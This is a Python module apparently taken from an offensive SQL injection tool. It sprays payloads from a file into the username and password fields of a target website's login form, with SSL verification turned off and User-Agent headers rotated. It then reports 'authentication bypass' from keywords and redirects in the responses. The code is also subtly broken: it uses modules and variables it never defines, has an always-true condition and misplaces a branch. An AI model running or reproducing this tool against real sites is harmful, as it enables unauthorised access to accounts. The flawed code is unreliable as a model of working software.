
try:

    import os
    import sys
    import logging
    from datetime import datetime
    from colorama import Fore,init,Style

    lib_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'constructor'))
    sys.path.append(lib_path)
    from constructor.construct import constructor as _constructor

    logging.basicConfig(filename="SQLJ.log",level=logging.INFO)

except ImportError:
    print("[!]wrong installation.please check the downloaded files.")
    logging.error("Wrong installation")

attack_type = ""

init()

class SingletonMeta(type):
    _instance = None

    def __call__(cls, *args, **kwargs):
        if not cls._instance:
            cls._instance = super().__call__(*args, **kwargs)
        return cls._instance

class Data_Exf(metaclass=SingletonMeta):
    def __init__(self, filename):
        self.filename = filename
        self.payload = _constructor(filename)
    
    async def Data_exf_attack(self):
        try:
            """This is the main block of our exploit program which sending the payloads. """
            global pattern,htmlpattern  
            done = False 
            filename = "finddatabaselink.txt" 
            current_directory = os.path.dirname(os.path.abspath(__file__)) 
            file_path = os.path.join(current_directory, filename) 

            with open(file_path, "r") as file: 
                payload = file.read()
                rows = payload.split("\n") 
                sorted_rows = sorted(rows) 
                sorted_payload = "\n".join(sorted_rows) #* 
                print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
                requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
                req = requests.get(url=urls,verify=False) 
                if req.status_code == 200: 
                    ask = input(f"[{datetime.now()}]{Fore.RESET}{Fore.GREEN}{Style.BRIGHT}[INFO]**Looks like the host is up: {Fore.RESET}{Fore.YELLOW}{urls} {Fore.RESET}{Fore.GREEN} \nDo you want to send the payload above to the website?** ")
                    logging.info(f"Could get a 200 request for the target: {urls} in the time : {datetime.now()}")

                    if ask.lower() == "y":
                        for line in sorted_payload.split("\n"): 
                            #############################################################33
                            params = { 
                                "username": line,
                                "password": line
                            }
                            ##############################################################################
                            # print(line)
                            await Prepare_the_headers()
                            for headerR in headers:
                                ack = requests.post(url=urls, data=params,verify=False,headers={"User-Agent": header}) 
                                print(f"[{datetime.now()}]|**[INFO]Current payload: | {Fore.RESET}{Style.BRIGHT}{line} |with status code|:{Fore.RESET}{Fore.BLUE}{ack.status_code}\n|Headers:|{header}**") 
                                # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                                await asyncio.sleep(5) 
                                if "error" in ack.text: 
                                    print(f"[{datetime.now()}]{Fore.RESET}{Fore.LIGHTWHITE_EX}|**[INFO]Vulnerability found in the response code:|ack.text\n|Headers:|{header}**")
                                    
                                vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) 
                                htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                                if vuln: 
                                    print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  | **Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
                                    logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                    await asyncio.sleep(3) 
                                
                                if htmlVULN:
                                    print(f"[{datetime.now()}] {Fore.RESET}{Fore.LIGHTMAGENTA_EX} |**Vulnerability found:|{Fore.RESET}{Fore.LIGHTBLUE_EX}{ack.text}|with the count of|:{Fore.RESET}{Fore.LIGHTMAGENTA_EX}{len(htmlVULN)}\n|Headers:**|{Fore.RESET}{Fore.LIGHTYELLOW_EX}{header}")
                                    logging.info(f"[INFO]Could find a vulnerability in the website html form:{urls} time:{datetime.now()} note:the vulnerability might not be that much significant.")
                                    await asyncio.sleep(3)
                                
                                word = "id" in req.text                             
                                errword = "error" in req.text
                                if word:
                                    print(f"[{datetime.now()}]**[INFO]{Fore.RESET}{Fore.LIGHTYELLOW_EX}  |** Vulnerability found in the response code: |{Fore.RESET}{Fore.CYAN} {ack.text} | vulnerability count:| {len(vuln)}|Attack:||authentication bypass SQL injection|\n|Headers:**|{header}**")
                                    logging.info(f"[INFO] vulnerability may exists in the target url(id parameters):{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                    await asyncio.sleep(3)
                                
                                if errword:
                                    print(f"[{datetime.now()}]",Fore.RED + "|**Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",header)
                                    logging.info(f"[INFO] vulnerability may exists in the target url:{urls} attack type:{attack_type} in the time:{datetime.now()}")
                                    await asyncio.sleep(3)
                                    
                                
                                    
                            if req.status_code == 302:                                             
                                print(f"[{datetime.now()}]",Fore.GREEN+"**[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection","\n|Headers:**|",header)
                                logging.info(f"Could bypass the authentication in the target:{urls} in the time:{datetime.now()}")
                                done = True
                            
                            if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                                print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]**Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection","\n|Headers:**|",headers)
                                logging.info(f"Could not find any injectable significant area in the target:{urls} in the time:{datetime.now()}")
                                
                    else:
                        print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
                        logging.error(f"Could not connect to the target:{urls} in the time:{datetime.now()}")
            
            #############################################################################################################
        except Exception as e:
            print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
            
        except KeyboardInterrupt:
            pass
            
        except ConnectionAbortedError as e:
            print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
            
        except ConnectionError as e:
            print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
            
        except ConnectionRefusedError as e:
            print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
            
        except ConnectionResetError as e:
            print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
            
        except UnicodeEncodeError:
            print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
        
        except AssertionError:
            pass
            
        except MemoryError:
            pass
                    
        finally:
            logging.info("Operation finished")
     
        
        
     